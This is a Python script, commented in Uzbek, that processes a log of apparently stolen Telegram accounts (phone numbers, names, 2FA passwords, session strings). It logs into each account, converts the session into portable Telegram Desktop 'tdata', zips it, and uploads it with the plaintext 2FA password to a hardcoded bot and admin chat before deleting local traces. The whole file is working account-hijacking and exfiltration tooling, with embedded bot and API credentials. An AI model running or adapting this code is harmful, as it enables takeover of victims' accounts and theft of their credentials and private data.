import asyncio
import os
import re
import logging
import warnings
import zipfile
import shutil
from pathlib import Path
from datetime import datetime

from opentele.td import TDesktop
from opentele.tl import TelegramClient
from telethon.sessions import StringSession
from telethon import TelegramClient as TelethonClient
import requests

# Barcha ogohlantirishlarni o'chiramiz
warnings.filterwarnings("ignore")
logging.getLogger('telethon').setLevel(logging.ERROR)

# Konfiguratsiya
API_ID = 33223639
API_HASH = 'da4a254e086d07d78998b7992e64a39b'
BOT_TOKEN = "8563399979:AAGOxsu3daN1CAa2xh6TefbTNhYw67BINpQ"
ADMIN_ID = "1263747123"

LOG_FILE = "logs/success.log"
OUTPUT_DIR = "tdata_output"

class TDataConverter:
    def __init__(self):
        self.output_dir = OUTPUT_DIR
        os.makedirs(self.output_dir, exist_ok=True)
    
    def read_sessions(self):
        """Log faylidan sessiyalarni o'qish"""
        if not os.path.exists(LOG_FILE):
            print(f"Xato: {LOG_FILE} topilmadi!")
            return []
        
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            content = f.read()
        
        # Sessiyalarni ajratib olish
        sessions = []
        blocks = re.split(r"{50,}", content)
        
        for block in blocks:
            phone = re.search(r"📞 TELEFON: (\+?\d+)", block)
            name = re.search(r"👤 ISM: (.+)", block)
            username = re.search(r"🆔 USERNAME: @?(\S+)", block)
            password = re.search(r"🔐 2FA PAROL: (.+)", block)
            session = re.search(r"🔑 SESSIYA: (.+)", block)
            
            if session:
                sessions.append({
                    "phone": phone.group(1) if phone else "noma'lum",
                    "name": name.group(1) if name else "noma'lum",
                    "username": username.group(1) if username else "yo'q",
                    "password": password.group(1) if password and password.group(1) != "yo'q" else None,
                    "session": session.group(1).strip()
                })
        
        return sessions
    
    async def convert_session(self, index, session_data):
        """Bitta sessiyani TData ga o'tkazish"""
        print(f"\n[{index}] Sessiya tekshirilmoqda: {session_data['phone']}")
        
        # Papka nomi
        safe_name = re.sub(r'[^\w\s-]', '', session_data['name']).strip()
        folder_name = f"tdata_{index}_{safe_name}_{session_data['phone'].replace('+', '')}"
        folder_path = os.path.join(self.output_dir, folder_name)
        
        # Telethon client
        client = TelegramClient(
            StringSession(session_data['session']),
            API_ID,
            API_HASH
        )
        
        try:
            await client.connect()
            
            if not await client.is_user_authorized():
                print(f"  ❌ Sessiya yaroqsiz")
                return None
            
            # User ma'lumotlarini tekshirish
            user = await client.get_me()
            print(f"  👤 Foydalanuvchi: {user.first_name} (@{user.username if user.username else 'yoq'})")
            
            # TData yaratish
            print(f"  🔄 TData yaratilmoqda...")
            td = await client.ToTDesktop(password=session_data['password'])
            td.SaveTData(folder_path)
            print(f"  ✅ TData yaratildi: {folder_path}")
            
            # Arxivlash
            zip_path = f"{folder_path}.zip"
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(folder_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, folder_path)
                        zipf.write(file_path, arcname)
            
            print(f"  📦 Arxiv yaratildi: {zip_path}")
            
            return {
                "folder": folder_path,
                "zip": zip_path,
                "user": user,
                "phone": session_data['phone'],
                "password": session_data['password']
            }
            
        except Exception as e:
            print(f"  ❌ Xatolik: {str(e)}")
            return None
        
        finally:
            await client.disconnect()
    
    def send_to_bot(self, result):
        """Natijani botga yuborish"""
        if not result:
            return
        
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            
            caption = f"""
✅ <b>TData muvaffaqiyatli yaratildi!</b>

📞 <b>Telefon:</b> <code>{result['phone']}</code>
👤 <b>Ism:</b> {result['user'].first_name} {result['user'].last_name or ''}
🆔 <b>Username:</b> @{result['user'].username if result['user'].username else 'yoq'}
🔐 <b>2FA Parol:</b> <code>{result['password'] if result['password'] else 'Yoq'}</code>
📁 <b>Papka:</b> {os.path.basename(result['folder'])}
⏰ <b>Vaqt:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            
            with open(result['zip'], 'rb') as f:
                response = requests.post(
                    url,
                    data={'chat_id': ADMIN_ID, 'caption': caption, 'parse_mode': 'HTML'},
                    files={'document': f}
                )
            
            if response.status_code == 200:
                print(f"  🤖 Botga yuborildi")
            else:
                print(f"  ⚠️ Botga yuborilmadi: {response.text}")
                
        except Exception as e:
            print(f"  ⚠️ Bot xatoligi: {e}")
    
    def cleanup(self, result):
        """Fayllarni tozalash"""
        if result:
            if os.path.exists(result['zip']):
                os.remove(result['zip'])
            if os.path.exists(result['folder']):
                shutil.rmtree(result['folder'])
    
    async def run(self):
        """Asosiy funksiya"""
        print("=" * 60)
        print("TData CONVERTER v2.0".center(60))
        print("=" * 60)
        
        sessions = self.read_sessions()
        
        if not sessions:
            print("Hech qanday sessiya topilmadi!")
            return
        
        print(f"Jami {len(sessions)} ta sessiya topildi.\n")
        
        results = []
        for i, session in enumerate(sessions, 1):
            result = await self.convert_session(i, session)
            if result:
                results.append(result)
                self.send_to_bot(result)
                self.cleanup(result)
            print("-" * 50)
        
        # Xulosa
        print("\n" + "=" * 50)
        print(f"✅ Jami: {len(results)}/{len(sessions)} muvaffaqiyatli")
        print("=" * 50)

async def main():
    converter = TDataConverter()
    await converter.run()

if __name__ == "__main__":
    asyncio.run(main())